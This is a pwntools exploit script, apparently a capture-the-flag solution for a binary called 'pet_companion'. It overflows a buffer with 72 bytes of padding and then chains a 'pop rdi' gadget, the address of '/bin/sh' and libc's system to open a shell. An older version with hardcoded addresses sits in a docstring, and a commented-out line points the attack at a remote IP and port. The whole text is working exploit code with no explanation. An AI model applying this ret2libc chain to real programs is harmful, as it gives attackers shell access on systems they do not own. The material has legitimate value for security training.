from pwn import *

"""
io = process("./pet_companion")

padding = b"A"*72
system = p64(0x7ffff784f420)
bin_sh = p64(0x7ffff7ff8f90)
pop_rdi_ret = p64(0x0000000000400743)

payload = padding + pop_rdi_ret + bin_sh + system

io.sendlineafter(":", payload)

io.interactive()
"""

elf = ELF('./pet_companion')
rop = ROP(elf)
io = process('./pet_companion')
#io = remote("94.237.54.183", 48870)
libc = ELF('./glibc/libc.so.6') #elf.libc
#libc.address = 0x7ffff7dc0000
#libc.address = 0x00007ffff7800000
pop_rdi = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
ret = p64((rop.find_gadget(['ret']))[0])
binsh = p64(next(libc.search(b'/bin/sh')))
system = p64(libc.sym['system'])
payload = b'A'*72 + pop_rdi + binsh + ret + system
io.sendline(payload)
io.interactive()

